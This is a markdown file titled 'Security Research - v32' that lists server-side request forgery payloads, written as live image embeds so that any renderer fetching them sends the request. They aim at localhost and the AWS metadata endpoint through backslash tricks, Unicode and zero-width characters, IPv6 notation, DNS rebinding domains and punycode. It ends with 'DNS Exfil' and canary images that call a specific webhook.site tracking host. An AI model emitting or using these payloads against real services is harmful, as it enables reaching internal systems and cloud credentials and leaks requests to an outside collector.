# Security Research - v32

## Parser Differentials & Edge Cases

Testing parser differences that might bypass URL validation.

---

### 1) Backslash vs Forward Slash

Some parsers treat backslashes as path separators:

| URL | Image |
|-----|-------|
| http://webhook.site\\@127.0.0.1/v32.gif | ![1](http://webhook.site\@127.0.0.1/v32.gif) |
| http://127.0.0.1\\@webhook.site/v32.gif | ![2](http://127.0.0.1\@webhook.site/v32.gif) |
| http://foo\\x00.127.0.0.1/v32.gif | ![3](http://foo\x00.127.0.0.1/v32.gif) |

---

### 2) Unicode Normalization

| Character | Image |
|-----------|-------|
| ①②⑦.⓪.⓪.① | ![u1](http://①②⑦.⓪.⓪.①/v32.gif) |
| Ⅰ②⑦.0.0.1 | ![u2](http://Ⅰ②⑦.0.0.1/v32.gif) |

---

### 3) IPv4-in-IPv6 Notations

| Format | Image |
|--------|-------|
| [::ffff:169.254.169.254] | ![4](http://[::ffff:169.254.169.254]/v32.gif) |
| [0000:0000:0000:0000:0000:ffff:a9fe:a9fe] | ![5](http://[0000:0000:0000:0000:0000:ffff:a9fe:a9fe]/v32.gif) |

---

### 4) DNS Rebinding Services

| Service | Image |
|---------|-------|
| make-127-0-0-1-rr.1u.ms | ![dns1](http://make-127-0-0-1-rr.1u.ms/v32.gif) |
| 127.0.0.1.nip.io | ![dns2](http://127.0.0.1.nip.io/v32.gif) |
| 127.0.0.1.xip.io | ![dns3](http://127.0.0.1.xip.io/v32.gif) |
| 127-0-0-1.sslip.io | ![dns4](http://127-0-0-1.sslip.io/v32.gif) |
| localtest.me | ![dns5](http://localtest.me/v32.gif) |
| vcap.me | ![dns6](http://vcap.me/v32.gif) |

---

### 5) AWS Metadata via DNS

| Service | Image |
|---------|-------|
| 169.254.169.254.nip.io | ![aws1](http://169.254.169.254.nip.io/latest/meta-data/) |
| 169-254-169-254.sslip.io | ![aws2](http://169-254-169-254.sslip.io/latest/meta-data/) |

---

### 6) Fragment Identifier Bypass

| URL | Image |
|-----|-------|
| https://webhook.site/13d8d983-5907-4ae8-95f6-a4db9181d2a2#http://127.0.0.1/v32.gif | ![frag1](https://webhook.site/13d8d983-5907-4ae8-95f6-a4db9181d2a2#http://127.0.0.1/v32.gif) |
| https://13d8d983-5907-4ae8-95f6-a4db9181d2a2.dnshook.site#@127.0.0.1/v32.gif | ![frag2](https://13d8d983-5907-4ae8-95f6-a4db9181d2a2.dnshook.site#@127.0.0.1/v32.gif) |

---

### 7) Query String Confusion

| URL | Image |
|-----|-------|
| https://webhook.site/13d8d983-5907-4ae8-95f6-a4db9181d2a2?url=http://127.0.0.1/v32.gif | ![q1](https://webhook.site/13d8d983-5907-4ae8-95f6-a4db9181d2a2?url=http://127.0.0.1/v32.gif) |
| https://webhook.site/13d8d983-5907-4ae8-95f6-a4db9181d2a2?@127.0.0.1/v32.gif | ![q2](https://webhook.site/13d8d983-5907-4ae8-95f6-a4db9181d2a2?@127.0.0.1/v32.gif) |

---

### 8) Tab/Newline in URL

| Description | Image |
|-------------|-------|
| Tab in host | ![t1](http://127	.0.0.1/v32.gif) |
| Newline in host | ![t2](http://127%0a.0.0.1/v32.gif) |
| CR in host | ![t3](http://127%0d.0.0.1/v32.gif) |

---

### 9) Rare TLDs that look like IPs

| Domain | Image |
|--------|-------|
| 127.0.0.1.com | ![r1](http://127.0.0.1.com/v32.gif) |
| 169.254.169.254.io | ![r2](http://169.254.169.254.io/v32.gif) |
| internal.169.254.169.254.test | ![r3](http://internal.169.254.169.254.test/v32.gif) |

---

### 10) Zero-Width Characters

| Description | Image |
|-------------|-------|
| ZWSP in host | ![z1](http://127​.0.0.1/v32.gif) |
| ZWJ in host | ![z2](http://127‍.0.0.1/v32.gif) |
| ZWNJ in host | ![z3](http://127‌.0.0.1/v32.gif) |

---

### 11) Punycode Variations

| Domain | Image |
|--------|-------|
| xn--nxasmq5b (localhost IDN) | ![p1](http://xn--nxasmq5b/v32.gif) |
| internal.xn--nxasmq5b | ![p2](http://internal.xn--nxasmq5b/v32.gif) |

---

### 12) Case Sensitivity

| URL | Image |
|-----|-------|
| HTTP://127.0.0.1/v32.gif | ![c1](HTTP://127.0.0.1/v32.gif) |
| Http://127.0.0.1/v32.gif | ![c2](Http://127.0.0.1/v32.gif) |
| http://LOCALHOST/v32.gif | ![c3](http://LOCALHOST/v32.gif) |
| http://LocalHost/v32.gif | ![c4](http://LocalHost/v32.gif) |

---

### DNS Exfil

![dns](https://v32-dns.13d8d983-5907-4ae8-95f6-a4db9181d2a2.dnshook.site/dns.gif)

### Canary

![canary](https://webhook.site/13d8d983-5907-4ae8-95f6-a4db9181d2a2/v32-canary.gif)

---

*v32 - Parser differentials & edge cases*
